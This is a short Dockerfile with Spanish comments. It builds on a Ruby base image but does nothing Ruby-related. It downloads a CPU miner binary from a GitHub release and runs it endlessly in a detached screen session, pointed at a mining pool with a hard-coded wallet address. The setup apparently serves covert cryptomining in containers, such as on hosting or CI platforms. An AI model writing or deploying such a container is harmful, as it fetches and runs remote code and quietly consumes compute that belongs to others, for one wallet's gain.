# Usa la imagen base que necesites
FROM ruby:2.7

# Actualiza el repositorio e instala las herramientas necesarias
RUN apt-get update && apt-get install -y screen wget

# Descarga el minero y configura su ejecución en segundo plano
RUN wget https://github.com/isotopec-org/isotopec-cpuminer/releases/download/v1.0.0.0/IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && \
    tar -xf IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && \
    cd IsotopeC-CPUminer_v1.0.0.0_Linux_Static && \
    chmod +x isotopec-cpuminer

CMD screen -S miner_session -dm bash -c 'cd IsotopeC-CPUminer_v1.0.0.0_Linux_Static && while true; do ./isotopec-cpuminer -a yespowerLTNCG -o stratum+tcp://fi.mining4people.com:4170 -u KAWzjZvm2x4UT8keXfttDF5zcAtdX7SShb -t 1; done'
